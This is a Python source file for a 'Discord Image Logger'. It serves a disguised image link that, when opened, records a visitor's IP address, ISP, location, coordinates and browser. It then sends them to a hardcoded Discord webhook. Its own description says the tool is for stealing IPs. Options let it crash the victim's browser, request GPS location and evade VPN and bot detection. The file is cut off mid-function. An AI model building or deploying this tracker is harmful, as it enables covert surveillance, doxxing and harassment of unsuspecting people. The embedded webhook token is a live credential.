# Image Logger
# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "C00lB0i"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1463557820640399466/aHvChuiRThqAwanJzLr8nhMlED-nVEaIGJnAdw1oBY1Qs5il7s5AAiCj5MM4kwNBG4sw",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/OverPowerC/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
